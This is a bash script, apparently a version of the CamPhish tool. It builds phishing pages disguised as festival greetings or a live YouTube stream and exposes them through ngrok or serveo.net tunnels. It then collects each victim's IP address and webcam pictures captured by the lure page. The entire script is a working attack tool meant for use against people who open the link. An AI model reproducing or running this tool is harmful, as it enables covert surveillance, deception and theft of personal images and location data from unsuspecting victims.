#!/bin/bash
source $PODGL/lib/fsh.cfg.sh

trap 'printf "\n";stop' 2

dependencies() {


command -v php > /dev/null 2>&1 || { cerr >&2 "PHP Not Found, Install it then restart"; exit 1; }

}

banner(){
cout DGL: Getting Things Ready...
sleep 0.4
cout DGL: Loading...
sleep 0.4
cout DGL: Continuing
sleep 0.3
echo
}

stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1

}

catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "Victim IP Address:\e[0m\e[0;77m %s\e[0m\n" $ip

cat ip.txt >> saved.ip.txt


}

checkfound() {

printf "\n"
printf "Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
cout Link Opened... Continuing....
catch_ip
rm -rf ip.txt

fi

sleep 0.5

if [[ -e "Log.log" ]]; then
cout Picture Recieved..!! You Can Press CTRL-C or Continue to Receive More! Continuing...
rm -rf Log.log
fi
sleep 0.5

done

}


server() {
cout Getting Few Ready....
sleep 0.4
command -v ssh > /dev/null 2>&1 || { cerr >&2 "SSH Not Found Error, Install it Then Restart"; exit 1; }

cout Starting Serveo...

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi

if [[ $subdomain_resp == true ]]; then

$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net  2> /dev/null > sendlink ' &

sleep 8
else
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &

sleep 8
fi
cout Starting A PHP Server....
fuser -k 3333/tcp > /dev/null 2>&1
php -S localhost:3333 > /dev/null 2>&1 &
sleep 3
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
cout Ready...! Getting Direct Link....
sleep 1
printf 'Direct link: \e[0m\e[1;76m %s\n' $send_link

}


payload_ngrok() {

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
sed 's+forwarding_link+'$link'+g' template.php > index.php
if [[ $option_tem -eq 1 ]]; then
sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
else
sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
fi
rm -rf index3.html

}

select_template() {
if [ $option_server -gt 2 ] || [ $option_server -lt 1 ]; then
cerr Invalid Option
sleep 1
banner
camphish
else
cout Choose:
cout 1-\) Festival Wishing \(Like Happy Birth Day and Happy New Year...\)
cout 2-\) Live Youtube TV  \(Open Live Video To Youtube\)
echo
default_option_template="1"
read -p $'CHOOSE [Default is 1]: ' option_tem
option_tem="${option_tem:-${default_option_template}}"
if [[ $option_tem -eq 1 ]]; then
read -p $'Enter Festival Name (Example: Happy Birth Day): ' fest_name
fest_name="${fest_name//[[:space:]]/}"
elif [[ $option_tem -eq 2 ]]; then
read -p $'Enter YouTube video watch ID: ' yt_video_ID
else
cerr Invalid Option
sleep 1
select_template
fi
fi
}

ngrok_server() {


if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { cerr >&2 Unzip Not Found, Install it Then restart; exit 1; }
command -v wget > /dev/null 2>&1 || { cerr >&2 Wget Not Found, Install it Then restart; exit 1; }
cout Downloading Ngrok Tunneling...
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
cerr Error While Downloading wget, If you are a termux user try Pkg Install wget
exit 1
fi

else
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
cerr An Error Ocured While Downloading
exit 1
fi
fi
fi

cout Starting A PHP   Server...
php -S 127.0.0.1:3333 > /dev/null 2>&1 &
sleep 2
cout Starting A NGROK Server...
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
cout Ready...! Getting Direct Link....
sleep 1
printf "Direct link: \e[0m\e[1;76m %s\e[0m\n" $link

payload_ngrok
checkfound
}

camphish() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

cout Choose One
cout 1-\) Ngrok \(Default\)
cout 2-\) Serveo
echo
default_option_server="1"
read -p $'CHOOSE: ' option_server
option_server="${option_server:-${default_option_server}}"
select_template
if [[ $option_server -eq 2 ]]; then

command -v php > /dev/null 2>&1 || { cerr >&2 SSH Not Found, Install it Then Restart; exit 1; }
start

elif [[ $option_server -eq 1 ]]; then
ngrok_server
else
cerr Invalid Option
sleep 1
camphish
fi

}


payload() {

send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
sed 's+forwarding_link+'$send_link'+g' template.php > index.php
if [[ $option_tem -eq 1 ]]; then
sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
else
sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
fi
rm -rf index3.html

}

start() {

default_choose_sub="Y"
default_subdomain="saycheese$RANDOM"

printf 'Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
read choose_sub
choose_sub="${choose_sub:-${default_choose_sub}}"
if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
subdomain_resp=true
printf 'Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
read subdomain
subdomain="${subdomain:-${default_subdomain}}"
fi

server
payload
checkfound

}

banner
dependencies
camphish

